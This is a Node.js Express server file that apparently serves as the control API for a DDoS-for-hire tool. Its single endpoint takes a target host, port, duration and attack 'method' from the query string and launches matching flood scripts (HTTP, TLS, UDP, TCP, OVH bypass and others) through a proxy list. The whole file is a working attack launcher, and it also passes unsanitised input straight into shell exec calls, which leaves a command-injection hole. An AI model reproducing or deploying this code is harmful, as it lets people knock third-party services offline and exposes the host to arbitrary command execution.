const express = require('express');
const { exec } = require('child_process');
const fs = require('fs');
const app = express();
const port = 20110;

const fetch = require("node-fetch");
const path = require('path');
const ProxyAgent = require("proxy-agent");

app.get('/ment', (req, res) => {
  const { target, port, time, methods } = req.query;

  res.status(200).json({
    message: 'API request received. Executing script shortly, By axcelsozu',
    target,
    port,
    time,
    methods
  });

  
       if (methods === 'konpek') {
    exec(`node httpraw.js ${target} ${time}`);
    } else if (methods === 'GLORY') {
    exec(`node glory.js ${target} ${time} 100 10 proxy.txt`);
    exec(`node https.js ${target} ${time} 100 10 proxy.txt`);
    } else if (methods === 'STORM') {
    exec(`node storm.js ${target} ${time} 100 10 proxy.txt`);
    } else if (methods === 'BROWSER') {
    exec(`node browser.js ${target} ${time} 100 10 proxy.txt`);
    } else if (methods === 'BYPASS') {
    exec(`node bypass.js ${target} ${time} 100 10 proxy.txt`);
    } else if (methods === 'OVH') {
    exec(`node ovh.js ${target} ${port} ${time}`);
    } else if (methods === 'UDP') {
    exec(`node udp.js ${target} ${port} ${time}`);
    } else if (methods === 'TCP') {
    exec(`node tcp.js ${target} ${port} ${time}`);
    } else if (methods === 'TLS') {
    exec(`node tls-fast.js ${target} ${time} 100 10 proxy.txt`);
    exec(`node tls.js ${target} ${time} 100 10 proxy.txt`);
    exec(`node glory.js ${target} ${time} 100 10 proxy.txt`);
    } else if (methods === 'HIT') {
    exec(`node tlsnet.js ${target} ${time} 100 10 proxy.txt`);
    exec(`node glory.js ${target} ${time} 100 10 proxy.txt`);
    exec(`node tls-fast.js ${target} ${time} 100 10 proxy.txt`);
    } else if (methods === 'XYN') {
    exec(`node xyn.js ${target} ${time} 100 10 proxy.txt`);
    exec(`node glory.js ${target} ${time} 100 10 proxy.txt`);
    exec(`node tlsnet.js ${target} ${time} 100 10 proxy.txt`);
    } else if (methods === 'RAPID') {
    exec(`node rapid.js ${target} ${time} 100 10 proxy.txt`);
    exec(`node glory.js ${target} ${time} 100 10 proxy.txt`);
    exec(`node xyn.js ${target} ${time} 100 10 proxy.txt`);
    } else if (methods === 'JAVA') {
    exec(`node java.js ${target} ${time} 100 10 proxy.txt`);
    exec(`node glory.js ${target} ${time} 100 10 proxy.txt`);
    exec(`node rapid.js ${target} ${time} 100 10 proxy.txt`);
        } else if (methods === 'FLOOD') {
    exec(`node flood.js ${target} ${time}`);
    }  else if (methods === 'HOLDV1') {
    exec(`node vhold.js ${target} ${time} 100 10 proxy.txt`);
    exec(`node vhold2.js ${target} ${time} 100 10 proxy.txt`);
   } else {
    console.log('Metode tidak dikenali atau format salah.');
  }
});

app.listen(port, () => {
    console.log(`API auren Started On Port: ${port}`);
});
